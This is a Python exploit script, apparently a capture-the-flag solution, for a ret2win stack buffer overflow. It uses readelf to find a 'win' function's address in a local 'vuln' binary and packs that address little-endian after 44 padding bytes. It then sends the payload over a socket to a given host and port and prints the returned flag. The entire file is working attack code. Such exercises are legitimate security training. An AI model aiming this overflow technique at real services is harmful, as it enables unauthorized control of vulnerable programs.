#!/usr/bin/env python3

import os
import sys
import socket
import subprocess


print('')
try:
    host = sys.argv[1]
    port = int(sys.argv[2])
except:
    print(os.path.basename(__file__),'[ HOST ] [ PORT ]')
    sys.exit()

def vuln0():
    # file to vuln 
    file = subprocess.getoutput('file vuln')
    # readelf and grep win func
    readelf = subprocess.getoutput("readelf vuln -s | grep 'win'")
    if not 'No such file' in (file and readelf):
        vuln0.file = file
        vuln0.readelf = readelf
        return True
    else:
        return False

def vuln1():
    if vuln0():
        print('\033[33mfile: file type of vuln\033[0m')
        print(vuln0.file)
        
        print('\033[33mreadelf: memory addr of win func\033[0m')
        print(vuln0.readelf)
        # split the addr
        MemoAddr = (vuln0.readelf).split()[1]
        # bytearray
        Tobytearray = bytearray.fromhex(MemoAddr)
        # reverse
        Tobytearray.reverse()
        # bytes
        Tobytes = bytes(Tobytearray)
        print('\033[33mpython: little-endian to bytes\033[0m')
        print(Tobytes)
        vuln1.byte = Tobytes
        return vuln1.byte
    else:
        print('\033[31;1mE:\033[0m required \'vuln\' file in this directory')
        sys.exit()

def CreateBuffer():
    addr = vuln1() # new eip
    Exploit = b'A'*(44)+addr+b'\n' # offset 44
    print('\033[33mpython: Createing buffer exploit\033[0m')
    print(Exploit)
    return Exploit


def send(host,port):
    payload = CreateBuffer()
    with socket.socket() as s:
        s.connect((host,port))
        print('\033[32msending payload..\033[0m\n')
        s.send(payload)
        
        flag = s.recv(8192).decode('utf-8').split('\n')[2]
        print(f'\033[36m{flag}\033[0m')

if __name__ == '__main__':
    try:
        send(host,port)
    except Exception as e:
        print('\033[31mE:\033[0m',e)
